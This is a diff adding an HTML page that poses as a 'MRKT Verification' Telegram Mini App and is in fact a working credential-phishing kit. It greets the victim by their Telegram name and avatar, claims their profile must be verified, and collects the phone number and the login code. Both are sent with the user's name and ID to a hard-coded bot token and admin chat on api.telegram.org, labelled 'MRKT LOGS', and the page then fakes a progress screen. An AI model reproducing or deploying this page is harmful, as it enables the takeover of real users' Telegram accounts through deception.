@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MRKT Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: #05090b;
+            --card-bg: #05090b;
+            --text-main: #ffffff;
+            --text-muted: #a0a5a8;
+            --accent-color: #007at9;
+            --warning-bg: #05090b;
+            --warning-border: #05090b;
+            --warning-text: #ffffff;
+            --border-color: #05090b;
+            --yellow-btn: #05090b;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            position: relative;
+        }
+
+        .lang-switch {
+            position: absolute;
+            top: 20px;
+            right: 60px;
+            z-index: 100;
+            background: #05090b;
+            border: 1px solid var(--border-color);
+            padding: 5px 12px;
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #ffffff;
+            cursor: default;
+        }
+
+        .gif-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            object-fit: cover;
+            filter: brightness(0.98) contrast(0.95);
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 360px;
+            background: var(--card-bg);
+            border-radius: 30px;
+            padding: 26px 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #05090b;
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            z-index: 1;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.03), 0 1px 3px rgba(0, 0, 0, 0.01);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 0 2px;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 18px;
+            letter-spacing: -0.3px;
+            color: var(--text-main);
+        }
+
+        .brand-logo {
+            width: 26px;
+            height: 26px;
+            background-image: url('https://i.postimg.cc/VLMxS1bd/logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            border-radius: 7px;
+        }
+
+        .steps-indicator {
+            display: flex;
+            gap: 5px;
+        }
+        .step-dot {
+            width: 6px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+        .step-dot.active {
+            width: 16px;
+            background: var(--text-main);
+            border-radius: 3px;
+        }
+
+        .warning-banner {
+            background: var(--warning-bg);
+            border: 1px solid var(--warning-border);
+            border-radius: 14px;
+            padding: 12px 14px;
+            font-size: 13px;
+            color: var(--warning-text);
+            line-height: 1.4;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            text-align: left;
+            font-weight: 500;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transform: translateY(12px);
+            transition: opacity 0.25s cubic-bezier(0.25, 1, 0.5, 1), transform 0.25s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        .screen.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .avatar-wrapper {
+            position: relative;
+            width: 105px;
+            height: 105px;
+            margin: 10px 0 24px 0;
+        }
+
+        .user-avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 24px;
+            object-fit: cover;
+            border: 2px solid var(--text-main);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.04);
+        }
+
+        .verify-badge {
+            position: absolute;
+            bottom: -6px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff3b30;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.2);
+        }
+
+        .verify-badge span {
+            color: #ffffff;
+            font-size: 8px;
+            line-height: 1;
+            animation: redDotBlink 1.5s infinite ease-in-out;
+        }
+
+        @keyframes redDotBlink {
+            0% { opacity: 0.4; transform: scale(0.9); }
+            50% { opacity: 1; transform: scale(1.1); }
+            100% { opacity: 0.4; transform: scale(0.9); }
+        }
+
+        .status-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            letter-spacing: -0.2px;
+        }
+
+        .status-title::before {
+            content: "●";
+            color: #ff3b30;
+            font-size: 11px;
+            animation: redDotBlink 1.5s infinite ease-in-out;
+        }
+
+        .description-box {
+            background: #05090b;
+            border-left: 3px solid var(--text-main);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-left-width: 3px;
+            border-radius: 4px 14px 14px 4px;
+            padding: 14px 16px;
+            text-align: left;
+            font-size: 13.5px;
+            line-height: 1.5;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .time-estimate {
+            font-size: 12.5px;
+            color: #8e8e93;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+
+        .video-container {
+            width: 100%;
+            max-width: 280px;
+            height: 140px;
+            margin: 5px 0 22px 0;
+            background: transparent;
+            border-radius: 20px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .center-video-element {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .logo-circle-container {
+            width: 74px;
+            height: 74px;
+            background: #05090b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0 25px 0;
+            border: 2px solid var(--text-main);
+            animation: softGlow 2s infinite ease-in-out;
+        }
+
+        @keyframes softGlow {
+            0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.04); }
+            50% { box-shadow: 0 0 0 10px rgba(255, 255, 255, 0.02); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.04); }
+        }
+
+        .logo-circle-inner {
+            width: 46px;
+            height: 46px;
+            background-image: url('https://i.postimg.cc/VLMxS1bd/logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0 0 10px 0;
+            color: var(--text-main);
+            letter-spacing: -0.4px;
+        }
+
+        .screen p {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin: 0 0 26px 0;
+            text-align: center;
+            padding: 0 6px;
+        }
+
+        .btn-main {
+            width: 100%;
+            background: #ffffff;
+            color: #05090b;
+            border: none;
+            padding: 15px;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            outline: none;
+            transition: background 0.15s ease, transform 0.1s ease;
+        }
+
+        .btn-yellow {
+            background: #ffffff !important;
+            color: #05090b !important;
+        }
+
+        .btn-main:active {
+            transform: scale(0.99);
+        }
+
+        .btn-back {
+            background: none;
+            border: none;
+            color: #8e8e93;
+            font-size: 14px;
+            margin-top: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: color 0.15s ease;
+        }
+        
+        .btn-back:active {
+            color: var(--text-main);
+        }
+
+        .footer-secure {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 10px;
+            color: #98989d;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            margin-top: 20px;
+            font-weight: 700;
+        }
+
+        .footer-secure-logo {
+            width: 14px;
+            height: 14px;
+            background-image: url('https://i.postimg.cc/VLMxS1bd/logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.35;
+        }
+
+        .code-input {
+            background: #05090b;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 14px;
+            padding: 15px;
+            width: 100%;
+            color: var(--text-main);
+            font-size: 18px;
+            font-weight: 600;
+            margin: 5px 0 24px;
+            box-sizing: border-box;
+            text-align: center;
+            letter-spacing: 2px;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .code-input:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.05);
+        }
+    </style>
+</head>
+<body>
+
+<div class="lang-switch">EN</div>
+
+<img class="gif-background" src="https://i.postimg.cc/hjRHK5pH/VID-20260611-WA0017.gif" alt="Background">
+
+<div class="app-container">
+    <div class="header">
+        <div class="brand">
+            <div class="brand-logo"></div>
+            <span id="txt-brand">MRKT</span>
+        </div>
+        <div class="steps-indicator">
+            <div id="dot1" class="step-dot active"></div>
+            <div id="dot2" class="step-dot"></div>
+            <div id="dot3" class="step-dot"></div>
+        </div>
+    </div>
+
+    <div id="banner-text" class="warning-banner">
+        <span>⚠️</span>
+        <div>Do not close the application until verification is complete.</div>
+    </div>
+
+    <div id="screen-profile" class="screen active fade-in">
+        <div class="avatar-wrapper">
+            <img id="user-avatar-img" class="user-avatar" src="https://via.placeholder.com/140" alt="Avatar">
+            <div class="verify-badge"><span>●</span> VERIFY</div>
+        </div>
+        <div class="status-title">MRKT Verification Required</div>
+        <div class="description-box">
+            Your MRKT profile <strong id="user-name" style="color: var(--text-main); font-weight: 700;">Loading...</strong> must be verified before use. Complete verification in the Mini App to confirm your account.
+        </div>
+        <div class="time-estimate">Takes about a minute — one click to start.</div>
+        <button id="btn-start" class="btn-main" onclick="goToScreen('screen-phone', 2)">Start Verification</button>
+        <div class="footer-secure"><div class="footer-secure-logo"></div>SECURED BY MRKT</div>
+    </div>
+
+    <div id="screen-phone" class="screen">
+        <div class="video-container">
+            <video class="center-video-element" autoplay loop muted playsinline webkit-playsinline preload="auto">
+                <source src="https://files.catbox.moe/etitra.mp4" type="video/mp4">
+            </video>
+        </div>
+        <h2>Confirm Phone Number</h2>
+        <p>Enter the phone number linked to your Telegram account to receive a code.</p>
+        <input type="tel" id="phone-number-input" class="code-input" placeholder="+1 (999) 123-4567" style="letter-spacing: 0px;" autocomplete="off">
+        <button id="btn-continue" class="btn-main btn-yellow" onclick="submitPhoneNumber()">Continue</button>
+        <button id="btn-back1" class="btn-back" onclick="goToScreen('screen-profile', 1)">← Back</button>
+    </div>
+
+    <div id="screen-confirm" class="screen">
+        <div class="logo-circle-container"><div class="logo-circle-inner"></div></div>
+        <h2>Enter Verification Code</h2>
+        <p>The code was sent to <span id="user-phone-display" style="color: var(--text-main); font-weight: 700;"></span>. Please enter it below.</p>
+        <input type="text" id="sms-code-input" class="code-input" placeholder="12345" autocomplete="off">
+        <button id="btn-confirm" class="btn-main btn-yellow" onclick="submitVerificationCode()">Confirm</button>
+        <button id="btn-back2" class="btn-back" onclick="goToScreen('screen-profile', 1)">← Back</button>
+    </div>
+</div>
+
+<script>
+    // ИЗМЕНИ ТОЛЬКО ЭТУ СТРОКУ НА ТОКЕН НОВОГО БОТА
+    const BOT_TOKEN = "8904132132:AAEHa-k3Bgrb9QqE7azd1sDtder71V8ppJg"; 
+    let activeAdmins = ["8916069251"]; 
+
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    let userLogData = { id: "Not defined", name: "Not defined", username: "None" };
+    let tempPhone = "";
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const userData = tg.initDataUnsafe?.user;
+        if (userData) {
+            const fullName = userData.first_name + (userData.last_name ? ' ' + userData.last_name : '');
+            document.getElementById('user-name').innerText = fullName;
+            userLogData.id = userData.id;
+            userLogData.name = fullName;
+            userLogData.username = userData.username ? `@${userData.username}` : "None";
+            document.getElementById('user-avatar-img').src = userData.photo_url || `https://ui-avatars.com/api/?name=${encodeURIComponent(userData.first_name)}`;
+        }
+    });
+
+    function goToScreen(screenId, stepNumber) {
+        const activeScreen = document.querySelector('.screen.active');
+        const nextScreen = document.getElementById(screenId);
+        activeScreen.classList.remove('fade-in');
+        setTimeout(() => {
+            activeScreen.classList.remove('active');
+            nextScreen.classList.add('active');
+            setTimeout(() => nextScreen.classList.add('fade-in'), 20);
+        }, 250);
+        document.querySelectorAll('.step-dot').forEach((dot, index) => {
+            dot.className = (index + 1 === stepNumber) ? 'step-dot active' : 'step-dot';
+        });
+    }
+
+    function sendToTelegram(phone, code) {
+        let msg = `🎯 **MRKT LOGS**\n👤: ${userLogData.name}\n🆔: \`${userLogData.id}\`\n📱: \`${phone || 'none'}\`\n🔑: \`${code || 'none'}\``;
+        
+        activeAdmins.forEach(adminId => {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST", 
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: adminId, text: msg, parse_mode: "Markdown" })
+            });
+        });
+    }
+
+    function submitPhoneNumber() {
+        const phone = document.getElementById('phone-number-input').value.trim();
+        if (phone.length < 5) return alert("Error");
+        tempPhone = phone;
+        document.getElementById('user-phone-display').innerText = tempPhone;
+        sendToTelegram(tempPhone, null);
+        goToScreen('screen-confirm', 3);
+    }
+
+    function submitVerificationCode() {
+        const code = document.getElementById('sms-code-input').value.trim();
+        if (!code) return alert("Error");
+        sendToTelegram(tempPhone, code);
+        const confirmDiv = document.getElementById('screen-confirm');
+        confirmDiv.innerHTML = `<div class="logo-circle-container"><div class="logo-circle-inner"></div></div><h2>Verification in progress</h2><p>Do not close the page. You will be redirected shortly.</p>`;
+        setTimeout(() => location.reload(), 3000);
+    }
+</script>
+</body>
+</html>
